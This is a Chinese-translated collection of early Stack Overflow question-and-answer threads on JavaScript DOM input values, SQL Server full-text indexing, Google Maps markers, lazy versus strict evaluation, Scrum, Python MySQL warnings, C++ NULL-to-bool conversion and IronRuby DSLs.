  var unique_textbox_id = 'mytext' + Math.random() * .3245;

  //Set div id
  dv.setAttribute('id',unique_div_id);

  //Set div style
  dv.style.position = 'absolute';       
  dv.style.left = '100 px';
  dv.style.top = '100 px';
  dv.style.width = '500px';
  dv.style.height = '100px';
  dv.style.padding = '7px';
  dv.style.backgroundColor = '#fdfdf1';
  dv.style.border = '1px solid #CCCCCC';
  dv.style.fontFamily = 'Trebuchet MS';
  dv.style.fontSize = '13px';

  //Create textbox element
  txt = document.createElement('input');
  txt.setAttribute('id',unique_textbox_id);
  txt.setAttribute('type','text');
  txt.style.marginRight = '10px';

  //Add textbox element to div
  dv.appendChild(txt)

  //Add the div to the document
  document.body.appendChild(dv);

  dv.innerHTML += '<input type="button" id="mysubmit" value="Read Textbox" onclick="javascript:alert(\'' + document.getElementById(unique_textbox_id).innerHTML + '\');" />';

} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-03-16T17:16:35.947

Textarea 元素没有**innerHTML**属性。只需像阅读任何其他表单元素一样阅读**value属性。**

```
document.getElementById(unique_textbox_id).value 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T17:17:51.327

输入 type="text" 字段没有 innerHTML，它们通常表示为自闭合标签。

请改用该`value`属性：

```
document.getElementById(unique_textbox_id).value 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-17T06:14:19.167

> I have to create the div element, add it to the document, and THEN add the children (textbox and submit button).

No, you don't in general have to do that. What was causing your problem was this:

```
...'onclick="javascript:alert(\'' + document.getElementById(unique_textbox_id).innerHTML + '\');" />'; 
```

That access to document.getElementById().innerHTML is occurring *at the time you create the string*, that is during the execution of create_div_dynamic(), *not* when the button is pressed. At that point, the field has just been created and has no `.value`. (It also has no `.innerHTML`, but then it never will as it's an input element.)

Your revised code uses a proper JavaScript function which is called at onclick time, and fixes the property to value, so that's OK. This approach also doesn't die when there are apostrophes or backslashes in the value string.

```
dv.innerHTML += '<input ... 
```

This serialises all the content in ‘dv’ to HTML text, then adds the string, and parses all the HTML back into DOM objects. This is really inefficient, and in the process you lose all JavaScript properties on the object, including event handlers and listeners.

“innerHTML+=” is *always* a mistake. Never use it.

```
txt.setAttribute('id',unique_textbox_id); 
```

Don't use setAttribute(), it doesn't work for certain attributes under IE. Instead use the more readable DOM-HTML properties:

```
txt.type= 'text';
txt.id= unique_textbox_id; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T20:05:52.187

For others in my boat, I want to show the solution. It turns out that I was adding elements in the wrong order.

I have to create the div element, add it to the document, and THEN add the children (textbox and submit button).

```
 //DIV
  dv = document.createElement('div');
  dv.setAttribute('id',unique_div_id);
  dv.style.position = 'absolute';       
  dv.style.left = xx + 'px';
  dv.style.top = yy + 'px';
  dv.style.width = '500px';
  dv.style.height = '20px';
  dv.style.padding = '7px';
  dv.style.backgroundColor = '#fdfdf1';
  dv.style.border = '1px solid #CCCCCC';
  dv.style.fontFamily = 'Trebuchet MS';
  dv.style.fontSize = '13px';

  //Add div element to body
  document.body.appendChild(dv);

  //TEXTBOX
  txt = document.createElement('input'); 
  txt.setAttribute('id',unique_textbox_id);
  txt.setAttribute('type','text');
  txt.style.marginRight = '10px';

  //Add textbox to div element
  document.getElementById('mydiv').appendChild(txt);

  var sbt = document.createElement('input');
  sbt.setAttribute('id','mysubmit');
  sbt.setAttribute('type','submit');
  sbt.setAttribute('value','GO');
  sbt.onclick = function() { alert(document.getElementById('mytext').value); };

  //Add submit to div element
  document.getElementById('mydiv').appendChild(sbt); 
```

Once this is done, **and I use the .value**, all goes well.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-12T10:43:15.450

```
 $cid         =$_REQUEST['cid'];
    $name        =addslashes($_REQUEST['name']);
    $email       =$_REQUEST['email'];
    $comments    =$_REQUEST['comments'];
    $comment_type=$_REQUEST['type'];
    $gstatus     =(isset($_REQUEST['gstatus'])) ? $_REQUEST['gstatus'] : 'no';
    $user_type   =(!empty($_SESSION['user_id'])) ? 'author' : 'user'; 
```

# sql-server - Upgrade database from SQL Server 2005 to 2008 — and rebuild full-text indexes?

> ID：651320
> 
> 赞同：2
> 
> 时间：2009-03-16T17:14:44.547
> 
> 标签：sql-server, sql-server-2005, sql-server-2008, full-text-search

I upgraded from Sql Server 2005 to Sql Server 2008\. I backed up the data in SQL Server 2005, and then I restored in SQL Server 2008\. Next, I found the catalog under "Storage->Full Text Catalogs", and I right-clicked on it, and am trying to rebuild the Full-Text Catalog. The database is only 600mb. However, it keeps running for hours, and never semes to finish.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-27T06:11:56.790

可能需要很长时间才能完成，我会查看目录的 FTLOG（.log 文件） - 如果它们很大，我会说它在索引您的文档时遇到问题。这是 RTM 2008 吗？

你可以尝试的东西。

*   删除索引并从头开始创建，不要使用界面 - 在脚本中运行它。
*   检查日志以查找可能的错误。
*   确保全文守护程序正在运行并为您的
    文档编制索引，CTP 的问题意味着守护程序已停止。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-24T16:42:06.580

SQL Server 2008 的全文搜索似乎很糟糕，因为它更紧密地集成到数据库中。有一些解决方法，但不是那么好。

# javascript - 确定标记是否在 Google 地图中可见

> ID：651341
> 
> 赞同：5
> 
> 时间：2009-03-16T17:21:01.117
> 
> 标签：javascript, google-maps

我正在开发一个谷歌地图应用程序，我遇到了这个问题。我需要从地图中删除所有超出范围的标记。

除了保留一个数组并查看每个标记的 latlng 之外，还有什么简单的方法可以做到这一点？

我不能使用 MarkerManager，因为我的积分太多了。我不想使用 clearOverlays() 因为它会关闭任何打开的标记。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T17:39:55.860

如果您不想单独查看每个标记，则最初将它们聚集成一些集合并计算集合的边界。

然后，您可以根据地图上当前显示的内容显示或隐藏集合（您可以使用 GMap2.getBounds() 找到地图的边界）。

我们在谈论多少点？

**更新**

A. 大约 65K。

我明白为什么在页面加载时不能创建 65K GMarkers。这将需要超过 5 秒。

我会将它们聚集成 200 个 ish 的组，当组的边缘在显示边缘之外的 1/4 地图宽度内时，然后查找、创建标记并显示相邻组。它超出了外边缘的 1/2 地图宽度，然后隐藏该组。

其他替代方法是使用第三方库，例如

*   集群标记 - [http://googlemapsapi.martinpearman.co.uk/articles.php?cat_id=1](http://googlemapsapi.martinpearman.co.uk/articles.php?cat_id=1)
*   集群器 - [http://www.acme.com/javascript/#Clusterer](http://www.acme.com/javascript/#Clusterer)

# language-agnostic - 您在课程中允许的最大方法的限制 N 是多少？

> ID：651346
> 
> 赞同：3
> 
> 时间：2009-03-16T17:22:24.530
> 
> 标签：language-agnostic, oop, class-design

在填写[面向对象概念调查](http://www.sefolklore.com/welcome.html)（为一些学术研究人员提供软件设计的真实数据）时，我遇到了这个问题：

您在课程中允许的最大方法的限制 N 是多少？

然后调查继续询问一旦达到这个限制 N，你是否重构你的类。

老实说，我在设计我的应用程序时从未考虑过这样的限制，并且想知道这背后的原因是什么。为什么我想给自己设置一个可能非常依赖于类功能的任意数字？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T17:26:02.663

您不必限制 N 的最大值。但你必须遵循“高凝聚力”原则。并且不要创建所有可以做任何事情的课程。

我想有一些 N 之后你应该开始担心。但这实际上取决于类本身及其主要目标。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T17:26:22.583

有一个神奇的数字可以作为规则的基础，这种想法是那些渴望将秩序强加于宇宙的人通常过于敏感的想法超过了他们的理智。

也就是说，如果您在一个类中有超过 20 个左右的方法，则很有可能它做得太多并违反了[SRP](http://en.wikipedia.org/wiki/Single_responsibility_principle)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T17:28:30.957

我也不会对事物进行任意限制，但我会说，一旦一个类的公共方法超过 10-20 个范围内的某个地方，我就会认真研究该类在做什么。回到我的 J2EE 时代，我们称它们为 Enterprise Java Melons。

相同的规则适用于各个方法的长度。我见过只有一两个方法的类，但每个方法都有数百行代码。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-03-16T20:30:00.567

自从我开始将课程分解为单一职责以来，我通常不会接近它变得有问题的地方。

此外，一个设计良好的类可能有 30 个方法，而设计不佳的类可能有 3 个（嗯，30 正在推动它，但重点是——这甚至不一定是一个好的指标，有点像计算 kloc）

您的框架/语言也可能需要很多没有业务逻辑的方法。

计算其中包含业务逻辑的重要方法的数量可能会很有趣——我会说大约 4 或 5 个是合适的。

当我查看源代码时，我很惊讶 JDK 类中实际上有多少方法，但它们是如此糟糕，如此之小且如此易于阅读，以至于拥有 20 个根本不是问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T17:33:43.957

就像其他人指出的那样，通常没有任意数量的方法，此时我会说“方法太多了！” 有时相反的情况可能同样糟糕，例如当一个对象有一个跨越数百行的整体式万能方法时。

话虽如此，如果我打开一个我以前没有看过的源文件并看到超过 10-20 种方法，我可能会扫描它，看看它是否不能以某种方式重构。

# haskell - 严格评估的巧妙用途在哪里？

> ID：651347
> 
> 赞同：6
> 
> 时间：2009-03-16T17:22:42.483
> 
> 标签：haskell, lazy-evaluation

似乎有很多聪明的事情是用延迟评估的语言完成的，而在严格评估的环境中是无法完成的。例如 Haskell 中的无限列表或[在一次 pass 中用树的最小值替换树中的每个元素](http://obfuscatedcode.wordpress.com/2008/02/16/functional-pearl-trees/)。

有没有用严格评估的语言完成的聪明事情不能用懒惰评估的语言轻松完成的例子？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-20T00:34:48.787

您可以用急切（严格）的语言而不是惰性语言轻松完成的主要事情：

*   从源代码预测程序的时间和空间成本

*   允许副作用，包括可变数组的恒定时间更新，这使得更容易快速实现一些算法

在我看来，Eager 语言的主要好处是它更容易让你的代码按照你想要的方式执行，并且很少有性能陷阱，其中代码的微小变化会导致性能的巨大变化。

话虽如此，总的来说我更喜欢用 Haskell 写复杂的东西。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-17T06:14:23.440

不; 有些事情你可以用惰性求值（AKA 正常顺序归约，或最左外归约）做，而严格求值是无法做到的，反之则不行。

原因是惰性求值在某种程度上是“最通用”的求值方式，它被称为：

> **计算充分性定理**：如果*某些*求值顺序终止并产生特定结果，则惰性求值也将终止并产生相同结果。

*（请注意，我们在这里*不是*在谈论图灵等价性）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T17:38:43.820

好吧，不，根据定义或多或少。在惰性评估语言中，*根据定义*，您应该得到与剧烈评估相同的结果（人们现在真的在使用“严格”吗？）评估，*除了*延迟评估直到需要，存储影响等等。所以如果你能得到一些不同的行为*，*那将是一个错误。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-11T17:25:15.807

惰性在日常语言中最明显的用法是“if”语句，其中只执行条件的一个分支。

纯粹非严格（惰性）语言的对立面是纯粹严格的语言。

至少有一种情况是“纯严格”是有益的，即[分支谓词](http://en.wikipedia.org/wiki/Branch_predication)。

链接文章的粗略解释：

很久以前，在 CPU 的世界中，执行指令是在测试分支条件时加载的。在某些时候，添加了指令流水线以减少加载时间。缺点是 CPU 不知道它需要加载哪个分支，因此默认情况下它会加载一个。如果分支走另一条路，则管道将在加载另一个分支的代码时停止。

解决方案是加载两个分支，执行两个分支，然后条件的结果告诉您保留哪个分支结果，以及丢弃哪个分支结果。然后你就不会遇到管道停顿了。

这是我最喜欢的（唯一的？）例子，说明了纯严格语言的好处。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2010-06-09T03:33:55.603

'Hello, World' 程序浮现在脑海，或者基本上与副作用有关的所有事情。

在严格的评估中，评估表达式很容易产生副作用，因为您对评估顺序有清晰的了解，因此副作用的顺序通常在副作用中很重要。这是严格评估的基本优势，也是大多数语言拥有它的原因。以及为什么甚至像 C 这样的面向性能的语言也经常使用值传递模型。

两者都可以做同样的事情，只是人类难度不同，你可以用严格的语言很好地模拟无限列表，你可以用非严格的语言模拟副作用的所有效果。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T18:40:59.130

正如[查理马丁](https://stackoverflow.com/users/35092/charlie-martin) [所写](https://stackoverflow.com/questions/651347/where-are-the-clever-uses-of-strict-evaluation/651408#651408)，严格和懒惰程序的结果应该是等价的。差异在于时间和空间限制和/或语言表达能力。除了对不需要的值的惰性的性能影响之外，在惰性语言中可以轻松引入新的语言结构而无需额外的语言概念（例如 LISP 中的宏）。无论如何，懒惰会咬你 [Haskell 尾递归是如何工作的？](https://stackoverflow.com/questions/412919/how-haskell-tail-recursion-works)同样的想法可能比严格的语言更复杂。（haskell 编译器不应该认识到计算`+1`比 make thunk 便宜`( x + 1 )`吗？）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T17:46:15.937

在 C# 等严格的求值语言中，可以通过将 thunk 返回到值 (Func) 而不是值本身来实现惰性求值。作为在 c# 中构建 Y-Combinator 的示例，可以通过以下方式完成：

```
public Func<int, int> Y(Func<Func<int, int>, Func<int, int>> f)
{
    return x => f(Y(f))(x);
} 
```

这个声明在惰性环境中会更简洁：

```
Y f = f (Y f) 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-17T00:40:05.333

我用 Erlang 编程了一下，发现我在大学学到的缺乏惰性评估非常令人沮丧。

我一直在简要地研究一些欧拉问题，特别是那些处理素数的问题。

通过惰性求值，您可以拥有一个返回所有素数列表的函数，但它实际上只返回您真正想要的那些。*因此，说“给我前n 个*素数”真的很容易。

如果没有惰性求值，您最终会得到一个更具约束性的“给我一个 1 到*n*之间所有素数的列表”。

* * *

## 回答 #9

> 赞同：-5
> 
> 时间：2009-04-08T08:33:32.560

不幸的是，被评为最佳答案的答案存在逻辑错误。从 Porges 引用的定理来看，并不能得出一个人可以用一种懒惰的语言做更多的事情。

相反的证明是，惰性语言中的所有程序都被编译为严格语言中的等效程序（进一步编译为汇编程序）或由用严格语言编写的解释器执行（是的，解释器最终*是*汇编程序）。

# agile - Scrum - 你在哪里做所有“其他”的事情？

> ID：651350
> 
> 赞同：6
> 
> 时间：2009-03-16T17:23:49.407
> 
> 标签：agile, scrum

使用 Scrum，用户故事的主体和这些词干提取任务等会迭代到成品——这很好。

但是，假设我有 100 个需要实现的功能，在现实世界中，在完成许多正常的辅助工作之前，我不能让任何开发人员参与这些功能 - 例如，做一个 UI 设计（当然你需要有对此功能的总体概念？），或构建不一定表现为功能的底层内容。

那么，这发生在哪里？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-03-16T17:29:01.143

我的理解是，在 scrum 中，您只构建实现每个用户故事所需的内容。因此，只有在需要为您正在处理的用户故事实现功能时，您才构建不是功能的底层内容。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-03-16T17:32:36.673

在我看来，非功能性任务仍然会出现在产品待办列表中——当我使用 Scrum 时，我们当然会这样做。我们必须向产品负责人解释为什么它们应该被视为重要，这样我们才能有时间去做。如果产品负责人不认为他们非常重要，他们就不会完成 - 负责人必须接受结果。在通过驳回您对负载测试之类的请求而被咬了几次之后，它们很可能会回来:)

另一方面，您可能会发现有一些您最初认为很重要的非功能性需求，但可以在没有影响的情况下憔悴。有时，只是有时，开发人员的直觉是错误的 :)

对于真正是门控因素的任务，我认为你只需要对产品负责人诚实，并*坚持*你必须去做。如果你不能与产品负责人相处到继续项目所需的程度，那么问题比没有 UI 设计要大:)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-27T03:41:17.533

我会将辅助任务构建到需要它的第一个功能中。

区分产品积压和冲刺积压之间的区别很重要。产品待办事项包含代表“什么/为什么”的用户故事，而不是“如何”。当一个故事被选为一个 sprint 时，故事会被分解成构建它所需的任务。例如：“UI 设计”将是“选择要购买的物品”故事的任务。在 sprint 计划级​​别，任务具有依赖关系也没有什么害处；事实上，大多数时候会有一些任务让其他产品积压项目的工作变得更轻松。

希望有帮助！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-03-16T17:30:18.800

基本上，它发生在每个功能中，说起来容易做起来难，但这可能是敏捷增量软件开发的重点。

例如，与其构建大量“不一定将自身表现为功能的基础内容”，不如怀疑自己不需要它，并且只为所讨论的功能构建所需的量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T17:29:40.517

在我看来，最好的办法是将尽可能多的东西作为“故事”包括在内，这样每个人都可以很好地了解时间的应用。

但是，总会有一些计划外的任务必须完成（例如，如果机器坏了，请重新安装）。对于该任务，一个选择是在每次迭代中留出一定百分比的空闲时间，如果每次迭代的速度为 300 个故事点，例如，一开始只有 250 个故事点，以便为计划外的事情留出空间，然后，在以下迭代中，您可以根据过去的历史调整这些值。

# javascript - FckEditor IE 和图像移动的奇怪崩溃

> ID：651351
> 
> 赞同：0
> 
> 时间：2009-03-16T17:24:20.560
> 
> 标签：javascript, internet-explorer, crash, fckeditor

我们已经使用 FCKEditor 很长时间了，并且对它非常满意。就在最近，虽然出现了一个新问题。

如果我们将图像插入到 html 中并保存，那么就可以了。如果我们然后在文本内移动图像并重新保存（即从控件获取 html 以保存到数据库），则 IE 崩溃（FF 当然不会）。但是如果我们在保存更改之前使用 Fck 的查看源代码按钮查看源代码，那么 IE 不会崩溃。在查看源操作期间是否会发生某种 html 检查以防止崩溃？

有没有人遇到过这个问题，如果有的话，你有什么修复建议吗（当然除了停止使用 IE，我很想告诉我所有的客户都这样做......）

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-18T13:43:00.820

此问题可追溯到 FCKEditor 的异常插件，而不是编辑器本身。

谢谢

# python - 在类中包装的调用上捕获 MySQL 警告——Python

> ID：651358
> 
> 赞同：-1
> 
> 时间：2009-03-16T17:26:59.697
> 
> 标签：python, mysql

当执行语句包装在类中时，我无法获取 Python 的 try/else 块来捕获 MySQL 警告。

我有一个类，它有一个 MySQL 连接对象作为属性，一个 MySQL 游标对象作为另一个，以及一个通过该游标对象运行查询的方法。游标本身包装在一个类中。这些似乎可以正确运行查询，但它们生成的 MySQL 警告不会在 try/else 块中作为异常捕获。为什么 try/else 块没有捕捉到警告？我将如何修改类或方法调用以捕获警告？

另外，我查看了重要的资料，但找不到可以帮助我理解这一点的讨论。我将不胜感激任何解释这一点的参考资料。

请看下面的代码。为冗长道歉，我是新手。

```
#!/usr/bin/python
import MySQLdb
import sys
import copy
sys.path.append('../../config')
import credentials as c # local module with dbase connection credentials
#=============================================================================
# CLASSES
#------------------------------------------------------------------------
class dbMySQL_Connection:
    def __init__(self, db_server, db_user, db_passwd):
        self.conn = MySQLdb.connect(db_server, db_user, db_passwd)
    def getCursor(self, dict_flag=True):
        self.dbMySQL_Cursor = dbMySQL_Cursor(self.conn, dict_flag)
        return self.dbMySQL_Cursor
    def runQuery(self, qryStr, dict_flag=True):
        qry_res = runQueryNoCursor(qryStr=qryStr, \
                                   conn=self, \
                                   dict_flag=dict_flag)
        return qry_res
#------------------------------------------------------------------------
class dbMySQL_Cursor:
    def __init__(self, conn, dict_flag=True):
        if dict_flag:
            dbMySQL_Cursor = conn.cursor(MySQLdb.cursors.DictCursor)
        else:
            dbMySQL_Cursor = conn.cursor()
        self.dbMySQL_Cursor = dbMySQL_Cursor
    def closeCursor(self):
        self.dbMySQL_Cursor.close()
#=============================================================================
# QUERY FUNCTIONS
#------------------------------------------------------------------------------
def runQueryNoCursor(qryStr, conn, dict_flag=True):
    dbMySQL_Cursor = conn.getCursor(dict_flag)
    qry_res =runQueryFnc(qryStr, dbMySQL_Cursor.dbMySQL_Cursor)
    dbMySQL_Cursor.closeCursor()
    return qry_res
#------------------------------------------------------------------------------
def runQueryFnc(qryStr, dbMySQL_Cursor):
    qry_res              = {}
    qry_res['rows']      = dbMySQL_Cursor.execute(qryStr)
    qry_res['result']    = copy.deepcopy(dbMySQL_Cursor.fetchall())
    qry_res['messages']  = copy.deepcopy(dbMySQL_Cursor.messages)
    qry_res['query_str'] = qryStr
    return qry_res
#=============================================================================
# USAGES
qry = 'DROP DATABASE IF EXISTS database_of_armaments'
dbConn = dbMySQL_Connection(**c.creds)
def dbConnRunQuery():
    # Does not trap an exception; warning displayed to standard error.
    try:
        dbConn.runQuery(qry)
    except:
        print "dbConn.runQuery() caught an exception."
def dbConnCursorExecute():
    # Does not trap an exception; warning displayed to standard error.
    dbConn.getCursor()  # try/except block does catches error without this
    try:
        dbConn.dbMySQL_Cursor.dbMySQL_Cursor.execute(qry)
    except Exception, e:
        print "dbConn.dbMySQL_Cursor.execute() caught an exception."
        print repr(e)
def funcRunQueryNoCursor():
    # Does not trap an exception; no warning displayed
    try:
        res = runQueryNoCursor(qry, dbConn)
        print 'Try worked. %s' % res
    except Exception, e:
        print "funcRunQueryNoCursor() caught an exception."
        print repr(e)
#=============================================================================
if __name__ == '__main__':
    print '\n'
    print 'EXAMPLE -- dbConnRunQuery()'
    dbConnRunQuery()
    print '\n'
    print 'EXAMPLE -- dbConnCursorExecute()'
    dbConnCursorExecute()
    print '\n'
    print 'EXAMPLE -- funcRunQueryNoCursor()'
    funcRunQueryNoCursor()
    print '\n' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-08-02T19:10:42.573

On first glance at least one problem:

```
 if dict_flag:
        dbMySQL_Cursor = conn.cursor(MySQLdb.cursors.DictCursor) 
```

shouldn't that be

```
 if dict_flag:
         self.dbMySQL_Cursor = conn.cursor(MySQLdb.cursors.DictCursor) 
```

You're mixing your self/not self. Also I would wrap the

```
self.conn = MySQLdb.connect(db_server, db_user, db_passwd) 
```

in a try/except block since I have a suspicion you may not be creating the database connection properly due to the import of db credentials (I'd toss in a print statement to make sure the data is actually being passed).

# c++ - 将“NULL”分配给布尔数据类型是否可以接受？

> ID：651361
> 
> 赞同：6
> 
> 时间：2009-03-16T17:27:18.543
> 
> 标签：c++, boolean

将“NULL”分配给布尔数据类型是否可以接受？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-03-16T17:31:35.973

从理论上讲，是的。但这是一件可怕的事情。

`NULL`是一个空指针常量，它被分配给一个指针以使其不指向任何内容。

```
...
ptr = NULL; // now it points to no object anymore
...

// or ptr == 0
if(ptr == NULL) {
    ...
} 
```

* * *

如果您对任何情况感兴趣，这里是对标准的参考。首先，空指针常量是 ( `4.10/1`)

> 空指针常量是整数类型的整数常量表达式 (5.19) 右值，其计算结果为零。

那么，如果我们将空指针常量转换为 会发生什么`bool`？解释`4.12/1`如下：

> 算术、枚举、指针或指向成员类型的指针的右值可以转换为 bool 类型的右值。将零值、空指针值或空成员指针值转换为 false；一个

（当它谈到`rvalue`它时，它本质上是一个简单的值，而不是那种类型的变量）。

现在，那实际上*是*什么`NULL`？读取`18.1/4`（请注意，在 C 中，空指针常量的定义不同。这可能是它显式引用 C++ 的原因）

> 宏 NULL 是本国际标准中实现定义的 C++ 空指针常量

该组合的重要部分是“ `A zero value ... is converted to false`”部分。对 bool 变量的赋值`NULL`将尝试转换`NULL`为布尔值。正如上面的段落所说，这样的转换是存在的并且是可以做到的。

`null pointer`另一个需要理解的关于空指针的重要事情是 a和 a之间的区别`null pointer constant`。正如我们刚刚读到的，空指针常量是一些零的整数值。但是， a`null pointer`及其值 a`null pointer value`是指针，它们的类型是指针类型。以下具有 int 类型并且是一个空指针常量

```
#define NULL ('n'-'n') // looks suspicious, but conforms 
```

因为它是一个整数常量表达式（本质上是一个在编译时已知的整数值），其值为零。下面是一个空指针值

```
(void*)NULL 
```

但它*不是*空指针常量。但无论如何，空指针*值*也被转换为布尔值，正如上面的引用所说：“ `A .. null pointer value .. is converted to false`”。所以你们都很好。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T17:31:56.177

从我的 n2798 副本中：

> **18.1 类型**
> 
> 3 宏 NULL 是本国际标准 (4.10) 中实现定义的 C++ 空指针常量

和

> **4.12 布尔转换 [conv.bool]**
> 
> 1 算术右值、无作用域枚举、指针或指向成员类型的指针可以转换为 bool 类型的右值。将零值、空指针值或空成员指针值转换为 false；任何其他值都将转换为 true。std::nullptr_t 类型的右值可以转换为 bool 类型的右值；结果值为假。

所以，是的，你似乎可以做到这一点。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T17:29:41.577

编译器不会拒绝它，因为 NULL 通常是 0 的预处理器 #define 并且 0 可以转换为 NULL 和 false 的指针表示。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T17:30:30.983

我的观点是，这会降低代码的可读性，但如果您愿意，请确定。NULL 毕竟只是 0。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T17:46:38.340

一般来说，它会起作用，因为指针被设计为可在布尔上下文中使用：

```
int *i = NULL;
if (i) // This is a pretty acceptable use of pointer conversions to bool
{
   // never runs.
} 
```

或者

```
int *i = NULL;
...
bool b = i; // Maybe not so terrible, but you're better off just assigning to a pointer. 
```

这是故意完成的（请参阅标准参考的 dirkgently 答案）以允许这种用法。如果您使用此语法：

```
bool i = NULL; // Don't do this
bool i2 = 0; // better
bool i3 = false; // Best 
```

那么你可能是在误导，但它会以一种可移植的、可预测的方式工作。要么 NULL 被定义为 0，在这种情况下，你将得到一个 false 值，或者如果 NULL 确实是一个 NULL 指针，那么它也将评估为 false。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-16T17:53:55.793

即使这在技术上是可行的，我也会避免它。似乎如果您需要一个空值，您应该建模为与布尔值不同的数据类型。

如果您要使用布尔值，请正确设计您的模块和代码以按设计使用它：具有两个潜在值，而不是三个。如果您需要三个，请使用另一种数据类型，例如 int 或 string，并让这三个值中的每一个都表示某种含义（在字符串中，空字符串表示空值）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T17:29:45.277

不，您应该使用技术术语 - “找不到文件”

编辑：

参考：[http ://thedailywtf.com/Articles/What_Is_Truth_0x3f_.aspx](http://thedailywtf.com/Articles/What_Is_Truth_0x3f_.aspx)

正确答案是否定的。

我认为您正在尝试做的是使用 NULL 来表示“未初始化”或“不知道”。这通常适用于数据库，但并不总是适用于代码，因为 NULL 的定义因预处理器和语言而异。

根据定义，布尔值是两态值。尝试将它们用作三态值是错误的。充其量这是一个肮脏的 hack，会在未来给其他开发人员造成混乱，最坏的情况是它是一个破坏性错误，一旦你的构建链中的任何内容发生变化，它就会在背后咬你。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-16T17:31:34.040

我不确定你为什么要这样做。如果您尝试初始化它，请使用 0。正如 MSN 所说，您的编译器不会拒绝它。也许您应该首先解释为什么要将 bool 设置为 NULL ？

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-16T17:53:39.430

你可以这样做，但我不明白这一点。假设你有：

```
void* p = NULL;
bool b = p; 
```

为什么不直接写成：

```
void* p = NULL;
bool b = (p != NULL); 
```

它更清晰，任何体面的编译器都会生成相同的代码。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-06-07T08:35:01.297

`NULL`在 C++ 中是指`Empty pointer`或称它为`\0`“零指针”、“无”等。
但所有这些：它是一个数字`0`-“零”。
bool`false`的 0 表示 - 所以可以接受。

但有时设置`bool`可能`NULL`不是你想要的：如果你想要一个特殊的 bool 包含值`true`//称为`false`.`undefine``3-state Boolean`

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2009-03-16T17:30:19.253

只要 false 仍然是 0 并且 NULL 仍然定义为 0 是的，但是这在未来可能会改变。我会说这是不好的做法，因为你混淆了概念并且失去了清晰度。

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2009-03-16T17:32:29.683

由于 NULL 通常不是 0 而是`(void*)0`，它不像在 C++ 中那样工作，因为在这种情况下 NULL 是一个指针。你必须做一个明确的演员：`reinterpret_cast<bool>(NULL)`，不，这不干净。你应该使用`true`/`1`和`false`/`0`

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2009-03-16T17:43:03.183

根据定义，NULL 不是 0。我不知道，但可能有一些编译器对 NULL 使用非零值，或者甚至可能在其地址后面的 thunk 中设置一些标志。您的代码被移植到一个只是您的运气。我必须修复由此产生的错误只是*我的*运气。

所以我说，“不，这是*不可接受*的。”

# ironruby - 从 IronRuby Dsl 访问返回值

> ID：651381
> 
> 赞同：1
> 
> 时间：2009-03-16T17:32:13.553
> 
> 标签：ironruby

我正在尝试创建一个 Dsl，该 Dsl 将具有位于单个 Dsl .rb 文件中的实例，然后从 CLR 运行它们。

我想在 IronRuby 中创建和设置 Clr 对象的值，然后在 .rb Dsl 实例文件运行后以某种方式访问​​ CLR 对象。

这是我的 Clr 对象，目前非常简单：

```
namespace Horn.Core.Dsl
{
    public class BuildMetaData : IBuildMetaData
    {
        public string Description { get; set; }
    }
} 
```

我有以下模块用于指定我的 Dsl 并将创建上面指定的 BuildMetaData 的实例：

```
module MetaBuilder
  module Dsl
    module Main
      attr_accessor :metadata
      def install(name, &block)
        @metadata = Horn::Core::Dsl::BuildMetaData.new
        yield self if block_given?
      end

      def description(desc)
         @metadata.Description = desc
      end

      def get_metadata
          @metadata
      end

    end
  end
end

include MetaBuilder::Dsl::Main 
```

在 Dsl 的实例运行后，我以某种方式希望能够从 Clr 代码中获取 @metadata 属性。

目前 Dsl 的一个实例如下所示：

```
install :horn do
  description "A .NET build and dependency manager"
end 
```

我的 C# 代码目前如下所示：

```
var engine = Ruby.CreateEngine();
engine.Runtime.LoadAssembly(typeof(BuildMetaData).Assembly);
engine.ExecuteFile(buildFile);
var klass = engine.Runtime.Globals.GetVariable("get_metadata"); 
```

无论如何我可以在不污染 Dsl 实例的情况下获得@metadata 属性吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T23:41:36.630

